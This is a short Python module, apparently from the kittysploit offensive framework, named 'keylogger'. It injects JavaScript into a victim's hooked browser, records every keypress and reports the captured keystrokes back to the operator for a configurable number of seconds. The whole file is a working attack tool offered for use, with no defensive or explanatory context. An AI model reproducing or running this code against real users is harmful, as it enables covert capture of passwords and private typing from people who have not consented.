from kittysploit import *
import time

class Module(BrowserAuxiliary):

	__info__ = {
		"name": "keylogger",
		"description": "Capture key",
		"browser": Browser.ALL,
		"platform": Platform.ALL
	}	
	
	time_active = OptInteger(10, "Number of seconds to keylog", True)
	
	def run(self):

		js = f"""
			let a = "";
			window.document.onkeypress = logKey;
			function logKey(e) {{
				if(window.event) {{ a += String.fromCharCode(event.keyCode);{self.get_result("a")}; }}
				else if(e.which) {{ a += String.fromCharCode(e.which);{self.get_result("a")}; }}
			}}
			
			"""
		self.send_js(js)
		time.sleep(self.time_active)
		self.send_js("window.document.onkeypress = '';")

